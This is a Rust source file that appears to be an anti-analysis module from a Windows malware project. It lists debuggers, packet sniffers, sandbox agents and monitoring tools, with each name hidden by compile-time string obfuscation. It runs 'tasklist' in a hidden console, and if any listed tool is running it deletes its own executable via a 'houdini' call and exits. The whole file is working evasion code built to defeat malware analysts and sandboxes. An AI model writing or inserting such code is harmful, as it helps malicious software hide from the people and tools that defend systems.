//List from https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiAnalysis/process.cpp
use std::os::windows::process::CommandExt;
use std::process::{Command, Stdio};
use winapi::um::winbase::CREATE_NO_WINDOW;

pub fn analysis_tools_process() {
    let process_list = get_process_list();
    let mut analysis_tools = vec![];
    analysis_tools.push(obfstr::obfstr!("ollydbg.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("ProcessHacker.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("tcpview.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("autoruns.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("autorunsc.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("filemon.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("procmon.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("regmon.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("procexp.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("idaq.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("idaq64.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("ImmunityDebugger.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("Wireshark.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("dumpcap.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("HookExplorer.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("ImportREC.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("PETools.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("LordPE.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("SysInspector.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("proc_analyzer.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("sysAnalyzer.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("sniff_hit.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("windbg.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("joeboxcontrol.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("joeboxserver.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("ResourceHacker.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("x32dbg.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("x64dbg.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("Fiddler.exe").to_string());
    analysis_tools.push(obfstr::obfstr!("httpdebugger.exe").to_string());

    for tool in &analysis_tools {
        if process_list.contains(tool) {
            let _ = houdini::disappear();
            std::process::exit(0);
        }
    }
}


fn get_process_list() -> String {
    let output = Command::new("cmd")
        .args(&["/C", "tasklist"])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(Stdio::piped())
        .output()
        .expect("Failed to execute command");
    String::from_utf8_lossy(&output.stdout).to_string()
}